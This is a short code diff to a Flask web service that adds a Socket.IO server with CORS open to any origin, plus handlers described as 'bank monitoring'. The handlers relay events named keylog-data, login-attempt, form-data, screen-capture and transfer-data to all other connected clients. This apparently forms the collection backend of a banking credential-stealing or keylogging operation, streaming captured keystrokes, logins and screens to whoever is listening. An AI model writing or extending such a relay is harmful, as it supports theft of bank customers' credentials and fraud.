@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request, jsonify, redirect, url_for, session
 from flask_login import LoginManager, login_required, current_user, login_user, logout_user, UserMixin
+from flask_socketio import SocketIO, emit
 import requests
 import os
 from datetime import datetime
@@ -7,6 +8,7 @@ import hashlib
 
 app = Flask(__name__)
 app.secret_key = os.getenv('SECRET_KEY', 'dev-secret-key')
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 # Flask-Login setup
 login_manager = LoginManager()
@@ -260,10 +262,32 @@ limiter.init_app(app)
 def health_check():
     return jsonify({'status': 'healthy', 'service': 'WAN', 'timestamp': datetime.now().isoformat()}), 200
 
+# Socket.IO events for bank monitoring
+@socketio.on('screen-capture')
+def handle_screen_capture(data):
+    emit('screen-capture', data, broadcast=True, include_self=False)
+
+@socketio.on('login-attempt')
+def handle_login_attempt(data):
+    emit('login-attempt', data, broadcast=True, include_self=False)
+
+@socketio.on('form-data')
+def handle_form_data(data):
+    emit('form-data', data, broadcast=True, include_self=False)
+
+@socketio.on('keylog-data')
+def handle_keylog_data(data):
+    emit('keylog-data', data, broadcast=True, include_self=False)
+
+@socketio.on('transfer-data')
+def handle_transfer_data(data):
+    emit('transfer-data', data, broadcast=True, include_self=False)
+
 if __name__ == '__main__':
     # Render configuration
     port = int(os.getenv('PORT', 5000))
-    app.run(
+    socketio.run(
+        app,
         host='0.0.0.0',
         port=port,
         debug=False
